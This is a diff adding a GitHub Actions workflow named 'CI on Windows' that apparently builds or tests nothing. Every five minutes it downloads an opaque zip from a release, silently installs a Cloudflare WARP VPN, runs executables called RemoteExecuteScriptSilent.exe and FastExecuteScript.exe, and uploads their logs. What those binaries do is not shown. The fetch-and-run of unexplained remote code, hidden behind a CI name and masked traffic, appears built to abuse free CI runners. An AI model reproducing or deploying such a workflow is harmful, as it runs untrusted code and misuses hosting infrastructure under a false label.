@@ -1,0 +1,75 @@
+name: CI on Windows
+
+on:
+  schedule:
+    - cron: "*/5 * * * *"
+  workflow_dispatch:
+
+jobs:
+  run-release:
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+    runs-on: windows-latest
+    steps:
+      - name: Download okok.zip from Release
+        run: |
+          $url = "https://github.com/okok882006/YYeTsBot/releases/download/1/okok.zip"
+          Invoke-WebRequest -Uri $url -OutFile okok.zip
+
+      - name: Unzip okok.zip
+        run: |
+          Expand-Archive -Path okok.zip -DestinationPath .
+      - name: Install Cloudflare WARP
+        run: |
+          # Download WARP installer
+          Invoke-WebRequest -Uri "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi" -OutFile "WARP.msi"
+          
+          # Install WARP silently
+          Start-Process msiexec.exe -ArgumentList '/i WARP.msi /quiet /norestart' -Wait
+          
+          # Wait for the service to start
+          Start-Sleep -Seconds 10
+          
+          # Register and connect using WARP CLI
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos registration new
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos connect
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          Start-Sleep -Seconds 10
+        shell: powershell
+      - name: Start RemoteExecuteScriptSilent.exe
+        working-directory: okok
+        run: |
+          Start-Process .\RemoteExecuteScriptSilent.exe
+
+      - name: Wait for RemoteExecuteScriptSilent.exe to exit
+        run: |
+          $processName = "RemoteExecuteScriptSilent"
+          Write-Host "Waiting for $processName process to exit..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has exited."
+
+      - name: Wait for FastExecuteScript.exe to exit
+        run: |
+          $processName = "FastExecuteScript"
+          Write-Host "Waiting for $processName process to exit..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has exited."
+
+      - name: Find dynamic logs folder
+        id: find_logs
+        run: |
+          $base = "okok\appslocal"
+          $dynamic = Get-ChildItem $base | Where-Object { $_.PSIsContainer } | Select-Object -First 1 -ExpandProperty Name
+          $logsPath = "$base\$dynamic\logs"
+          echo "logsPath=$logsPath" >> $env:GITHUB_ENV
+
+      - name: Upload logs as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: logs
+          path: ${{ env.logsPath }}/**
